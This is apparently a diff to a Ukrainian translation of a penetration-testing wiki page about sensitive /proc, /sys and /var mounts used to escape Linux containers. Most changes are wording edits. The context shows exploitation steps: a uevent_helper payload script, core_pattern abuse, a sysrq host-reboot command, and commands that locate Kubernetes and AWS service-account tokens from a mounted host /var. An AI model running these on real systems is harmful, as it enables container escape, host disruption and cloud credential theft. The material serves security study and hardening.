@@ -15,7 +15,7 @@
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Описано в [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Дозволяє визначити програму для виконання при генерації core-файлу з перші 128 байт як аргументи. Це може призвести до виконання коду, якщо файл починається з пайпа `|`.
+- Дозволяє визначити програму для виконання при генерації файлу ядра з першими 128 байтами як аргументами. Це може призвести до виконання коду, якщо файл починається з каналу `|`.
 - **Приклад тестування та експлуатації**:
 
 ```bash
@@ -32,7 +32,7 @@ sleep 5 && ./crash & # Викликати обробник
 - **Приклад перевірки доступу**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до modprobe
+ls -l $(cat /proc/sys/kernel/modprobe) # Перевірити доступ до modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
@@ -49,7 +49,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до 
 
 - Дозволяє реєструвати інтерпретатори для неоригінальних бінарних форматів на основі їх магічного номера.
 - Може призвести до підвищення привілеїв або доступу до кореневого шеллу, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
-- Відповідна експлуатація та пояснення:
+- Відповідний експлойт та пояснення:
 - [Бідний чоловік rootkit через binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Детальний посібник: [Посилання на відео](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
@@ -72,12 +72,12 @@ echo b > /proc/sysrq-trigger # Перезавантажує хост
 #### **`/proc/kmsg`**
 
 - Відкриває повідомлення з кільцевого буфера ядра.
-- Може допомогти в експлуатації ядра, витоках адрес та надати чутливу інформацію про систему.
+- Може допомогти в експлуатації ядра, витоках адрес та надати чутливу системну інформацію.
 
 #### **`/proc/kallsyms`**
 
 - Перераховує експортовані символи ядра та їх адреси.
-- Важливо для розробки експлуатацій для ядра, особливо для подолання KASLR.
+- Важливо для розробки експлойтів ядра, особливо для подолання KASLR.
 - Інформація про адреси обмежена, якщо `kptr_restrict` встановлено на `1` або `2`.
 - Деталі в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -106,7 +106,7 @@ echo b > /proc/sysrq-trigger # Перезавантажує хост
 
 #### **`/proc/sched_debug`**
 
-- Повертає інформацію про планування процесів, обходячи захисти простору PID.
+- Повертає інформацію про планування процесів, обминаючи захисти простору імен PID.
 - Відкриває імена процесів, ID та ідентифікатори cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
@@ -119,14 +119,14 @@ echo b > /proc/sysrq-trigger # Перезавантажує хост
 #### **`/sys/kernel/uevent_helper`**
 
 - Використовується для обробки `uevents` пристроїв ядра.
-- Запис у `/sys/kernel/uevent_helper` може виконати довільні скрипти при спрацьовуванні `uevent`.
-- **Приклад експлуатації**: %%%bash
+- Запис у `/sys/kernel/uevent_helper` може виконувати довільні скрипти при спрацьовуванні `uevent`.
+- **Приклад для експлуатації**: %%%bash
 
 #### Створює корисне навантаження
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Знаходить шлях хоста з OverlayFS для контейнера
+#### Знаходить шлях хоста з монтування OverlayFS для контейнера
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
@@ -162,12 +162,12 @@ cat /output %%%
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` пропонує інтерфейс нульових правил для налагодження ядра.
+- `debugfs` пропонує "без правил" інтерфейс для налагодження ядра.
 - Історія проблем з безпекою через його необмежений характер.
 
 ### Уразливості `/var`
 
-Папка хоста **/var** містить сокети виконання контейнерів та файлові системи контейнерів. Якщо цей каталог змонтовано всередині контейнера, цей контейнер отримає доступ на читання та запис до файлових систем інших контейнерів з привілеями root. Це може бути зловжито для перемикання між контейнерами, викликання відмови в обслуговуванні або створення бекдору для інших контейнерів та додатків, які в них працюють.
+Папка хоста **/var** містить сокети виконання контейнерів та файлові системи контейнерів. Якщо цей каталог змонтовано всередині контейнера, цей контейнер отримає доступ на читання та запис до файлових систем інших контейнерів з привілеями root. Це може бути зловжито для переходу між контейнерами, викликання відмови в обслуговуванні або для створення бекдору в інших контейнерах та програмах, що в них виконуються.
 
 #### Kubernetes
 
@@ -226,8 +226,12 @@ XSS було досягнуто:
 
 Контейнер може читати токени K8s serviceaccount або токени AWS webidentity, що дозволяє контейнеру отримати несанкціонований доступ до K8s або хмари:
 ```bash
-/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
-/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
+<SNIP>
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
+/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
 #### Docker
 
@@ -250,14 +254,14 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 #### Примітка
 
 Фактичні шляхи можуть відрізнятися в різних налаштуваннях, тому найкраще використовувати команду **find** для
-локалізації файлових систем інших контейнерів
+виявлення файлових систем інших контейнерів та токенів SA / веб-ідентичності
 
 
 
 ### Посилання
 
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
-- [Розуміння та зміцнення Linux контейнерів](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
-- [Зловживання привілейованими та непривілейованими Linux контейнерами](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
+- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
+- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
 
 {{#include ../../../../banners/hacktricks-training.md}}
